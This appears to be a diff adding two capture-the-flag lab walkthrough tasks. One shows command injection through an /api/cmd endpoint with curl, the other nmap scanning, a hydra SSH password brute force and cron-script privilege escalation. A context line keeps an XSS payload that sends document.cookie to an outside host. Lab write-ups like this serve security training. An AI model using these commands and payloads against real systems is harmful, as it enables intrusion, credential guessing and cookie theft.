@@ -1083,3 +1083,137 @@ Using XSS to steal cookies
     ```
     <script type="text/javascript">document.location="http://a.b.c.d/?c="+document.cookie;</script>
     ```
+
+# Task 24
+
+Manual fuzzing of /api/cmd endpoint
+
+* Use curl to pass ls command, sed to filter out JSON response and return the lines we need
+    ```
+    curl --silent http://10.10.147.44:3000/api/cmd/ls | sed 's/\\n/\n/g' | sed 's/"stdout":"/\n/g' | sed -n -e '2,$p' | sed '$d'
+    bin
+    boot
+    data
+    dev
+    etc
+    home
+    lib
+    lib64
+    local
+    media
+    mnt
+    opt
+    proc
+    root
+    run
+    sbin
+    srv
+    sys
+    tmp
+    usr
+    var
+    ```
+* Use curl to pass whoami command
+    ```
+    curl --silent http://10.10.147.44:3000/api/cmd/whoami | sed 's/\\n/\n/g' | sed 's/"stdout":"/\n/g' | sed -n -e '2,$p' | sed '$d'                                                                           
+    root
+    ```
+* Use curl to list /home directory, encode space with %20 and forward slash with %2f
+    ```
+    curl --silent http://10.10.147.44:3000/api/cmd/ls%20%2fhome | sed 's/\\n/\n/g' | sed 's/"stdout":"/\n/g' | sed -n -e '2,$p' | sed '$d'
+    bestadmin
+    ec2-user
+    ```
+* Use curl to check /home/bestadmin's directory
+    ```
+    curl --silent http://10.10.147.44:3000/api/cmd/ls%20%2fhome%2fbestadmin | sed 's/\\n/\n/g' | sed 's/"stdout":"/\n/g' | sed -n -e '2,$p' | sed '$d'
+    bin
+    new-room
+    run.sh
+    user.txt
+    ```
+* Use curl to read the user flag
+    ```
+    curl --silent http://10.10.147.44:3000/api/cmd/cat%20%2fhome%2fbestadmin%2fuser.txt | sed 's/\\n/\n/g' | sed 's/"stdout":"/\n/g' | sed -n -e '2,$p' | sed '$d'
+    ```
+
+# Task 25
+
+Exploring cronjob privilege escalation
+
+* Enumerate - nmap
+    ```
+    nmap -A -T4 10.10.129.84 | tee nmap.txt
+
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 18:01 EST
+    Nmap scan report for 10.10.129.84
+    Host is up (0.22s latency).
+    Not shown: 999 closed ports
+    PORT     STATE SERVICE VERSION
+    4567/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 86:cc:1a:05:2d:7d:4c:7c:64:20:3f:91:4e:c9:9f:aa (RSA)
+    |   256 0d:55:41:d3:0a:65:df:af:28:4c:26:3b:b2:e6:05:e9 (ECDSA)
+    |_  256 85:40:56:00:f4:51:46:33:c5:1a:b9:eb:31:d9:b4:85 (ED25519)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 19.20 seconds
+    ```
+
+* Brute force sam's SSH password - hydra
+    ```
+    hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.129.84 -s 4567 ssh
+    Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-27 18:04:02
+    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+    [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+    [DATA] attacking ssh://10.10.129.84:4567/
+    [4567][ssh] host: 10.10.129.84   login: sam   password: [removed]
+    1 of 1 target successfully completed, 1 valid password found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-27 18:04:12
+    ```
+* Login as sam with the password you brute forced
+* Check crontab, nothing import
+    ```
+    cat /etc/crontab
+    # /etc/crontab: system-wide crontab
+    # Unlike any other crontab you don't have to run the `crontab'
+    # command to install the new version when you edit this file
+    # and files in /etc/cron.d. These files also have username fields,
+    # that none of the other crontabs do.
+
+    SHELL=/bin/sh
+    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+    # m h dom mon dow user  command
+    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+    ```
+* Check /home directory and find something related to scripts
+    ```
+    sam@ip-10-10-129-84:/home$ ls -lrta                                                                                                                                       
+    total 20                                                                                                                                                                  
+    drwxr-xr-x  5 root   root   4096 Dec 19  2019 .                                                                                                                           
+    drwxr-xr-x  6 ubuntu ubuntu 4096 Dec 19  2019 ubuntu                                                                                                                      
+    drwxr-xr-x 23 root   root   4096 Feb 27 23:00 ..                                                                                                                          
+    drwxrwxrwx  2 root   root   4096 Feb 27 23:25 scripts                                                                                                                     
+    drwxr-xr-x  6 sam    sam    4096 Feb 27 23:25 sam           
+    ```
+* Find an interesting cleanup script
+    ```
+    sam@ip-10-10-129-84:/home/scripts$ ls -lrta
+    total 16
+    drwxr-xr-x 5 root   root   4096 Dec 19  2019 ..
+    -rw-r--r-- 1 root   root      5 Dec 19  2019 test.txt
+    -rwxrwxrwx 1 ubuntu ubuntu   14 Feb 27 23:25 clean_up.sh
+    drwxrwxrwx 2 root   root   4096 Feb 27 23:25 .
+    ```
+* Modify the script to include grabbing the flag, then read it
+    ```
+    cat /home/ubuntu/flag2.txt > /tmp/f.txt
+    chmod 777 /tmp/f.txt
+    ```
